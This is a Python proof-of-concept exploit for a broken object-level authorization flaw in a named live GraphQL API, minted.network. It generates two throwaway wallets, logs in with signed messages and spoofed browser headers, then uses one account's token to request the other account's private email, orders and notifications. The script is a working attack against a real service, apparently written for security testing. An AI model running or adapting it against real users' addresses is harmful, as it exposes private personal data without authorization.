#!/usr/bin/env python3
"""minted.network BOLA PoC - throwaway wallets, minimal traffic (~10 requests)."""
import json, time, sys
import requests
from eth_account import Account
from eth_account.messages import encode_defunct

API = "https://api.minted.network/graphql"
MSG_TMPL = (
    "Welcome to Minted!\n\n"
    "Please sign to let us verify that you are the owner of this address: {addr}\n\n"
    "By signing you confirm that you accept the following:\n\n"
    "Minted Terms and Conditions: https://minted.network/about/termsandconditions.pdf\n"
    "Minted Code of Conduct: https://minted.network/about/codeofconduct.pdf\n\n"
    "and acknowledge that you have read our Minted Privacy Notice: https://minted.network/about/privacynotice.pdf\n\n"
    "This request and signature will not trigger a blockchain transaction nor cost any gas fees.\n"
    "The electronic hash record will be stored in our databases as a record of your agreement.\n\n"
    "Your authentication status will reset after 24 hours.\n"
    "timestamp: {ts}"
)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"

def gql(query, variables=None, token=None):
    h = {"Content-Type": "application/json", "User-Agent": UA,
         "Origin": "https://minted.network", "Referer": "https://minted.network/"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    r = requests.post(API, json={"query": query, "variables": variables or {}},
                      headers=h, timeout=30)
    print(f"[HTTP {r.status_code}]", flush=True)
    try:
        return r.json()
    except Exception:
        print(r.text[:500]); return None

def login(wallet):
    acct = Account.from_key(wallet)
    addr = acct.address.lower()
    ts = int(time.time() * 1000)  # ms; retry with seconds if rejected
    msg = MSG_TMPL.format(addr=addr, ts=ts)
    sig = acct.sign_message(encode_defunct(text=msg)).signature.hex()
    sig = sig if sig.startswith("0x") else "0x" + sig
    q = """mutation login($timestamp: Long!, $evmAddress: EvmAddress!, $signature: String!) {
  login(input: {timestamp: $timestamp, evmAddress: $evmAddress, signature: $signature}) {
    token
    evmAddress
  }
}"""
    out = gql(q, {"timestamp": ts, "evmAddress": addr, "signature": "0x" + acct.sign_message(encode_defunct(text=msg)).signature.hex()[2:]})
    if out and (out.get("errors") or not (out.get("data") or {}).get("login")):
        print("ms-timestamp failed, retrying seconds:", json.dumps(out)[:300], flush=True)
        ts = int(time.time())
        msg = MSG_TMPL.format(addr=addr, ts=ts)
        out = gql(q, {"timestamp": ts, "evmAddress": addr,
                      "signature": "0x" + acct.sign_message(encode_defunct(text=msg)).signature.hex()})
    tok = ((out or {}).get("data") or {}).get("login", {}).get("token")
    print(f"LOGIN {addr} -> {'TOKEN OK (' + str(len(tok)) + ' chars)' if tok else json.dumps(out)[:300]}", flush=True)
    return tok

Q_PRIV = """query getUserPrivateSetting($address: EvmAddress!) {
  user(address: $address) {
    evmAddress
    privateSetting { email emailVerified offerReceived }
  }
}"""
Q_ORDERS = """query getUserOrders($address: EvmAddress!, $first: Int!) {
  user(address: $address) {
    evmAddress
    orders(first: $first) { totalCount }
  }
}"""
Q_NOTIF = """query getUserNotifications($address: EvmAddress!, $first: Int!) {
  user(address: $address) {
    evmAddress
    notifications { userAddress totalUnreadCount notificationConnection(first: $first) { totalCount } }
  }
}"""

def show(tag, resp):
    print(f"### {tag}\n{json.dumps(resp)[:800]}\n", flush=True)

def main():
    a = Account.create().key.hex(); b = Account.create().key.hex()
    wa = Account.from_key(a); wb = Account.from_key(b)
    print(f"WALLET_A={wa.address}", flush=True)
    print(f"WALLET_B={wb.address}", flush=True)

    # 0. reachability / CF check
    show("unauthenticated probe (__typename)",
         gql("query { __typename }"))

    ta = login(a)
    tb = login(b)

    # baseline: own data with own token
    if ta:
        show("BASELINE A-token -> privateSetting(A)",
             gql(Q_PRIV, {"address": wa.address}, ta))
        # THE TEST: attacker token A reading victim B's user-scoped data
        show("BOLA TEST A-token -> privateSetting(B)",
             gql(Q_PRIV, {"address": wb.address}, ta))
        show("BOLA TEST A-token -> orders(B)",
             gql(Q_ORDERS, {"address": wb.address, "first": 5}, ta))
        show("BOLA TEST A-token -> notifications(B)",
             gql(Q_NOTIF, {"address": wb.address, "first": 5}, ta))
        # no-token comparison
        show("NO-TOKEN -> privateSetting(B)",
             gql(Q_PRIV, {"address": wb.address}))
        show("B-token -> privateSetting(B) (victim self)",
             gql(Q_PRIV, {"address": wb.address}, tb))
    else:
        print("LOGIN FAILED - aborting BOLA tests", flush=True)

if __name__ == "__main__":
    main()
